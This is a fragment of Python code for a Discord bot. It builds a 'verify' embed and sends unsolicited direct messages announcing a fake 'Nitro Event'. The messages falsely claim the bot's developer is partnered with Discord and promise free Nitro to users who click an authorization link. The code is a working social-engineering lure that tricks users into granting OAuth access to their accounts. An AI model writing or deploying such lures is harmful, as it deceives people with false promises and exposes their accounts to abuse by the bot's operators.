...
def get_verify_em():
  embed = discord.Embed(description=f"[<:emoji_1720024210862:1258097469573828758> Click Here to verify And Join Ecstacy Shop! <a:emoji_1720024544500:1258098868869005413>]({authorize_url})", color=color)
  embed.set_image(url="https://media.discordapp.net/attachments/1258095200840974426/1258100293892177990/213aS.png?ex=6686d0b4&is=66857f34&hm=ce4fdfe9ebecd4c34fe9bd81ea4be892b2b5afdbdf23c6c2078388a833f7cde8&=&format=webp&quality=lossless&width=687&height=386")
  return embed
...
async def on_message(message):
  ...
  if message.guild == None:
    embed = discord.Embed(color=color, title="<:giftbox:1032974503447380041> Nitro Event <:giftbox:1032974503447380041>", description=f"__{bot.user.name} Development__ Is Now Partner <:partner:1032974205945393152> With Discord And Giving Nitros To People <:earlysupport:1032976108854976593>\nYou Can Get Nitro <:rr_gift:1032974253001293834>\nAll You Have To Do Is\n1. Authorize {bot.user.name} By Clicking [Here]({authorize_vanity})\n2. Wait for 24 hours and nitro will be sent in your dms\n3. Enjoy!")
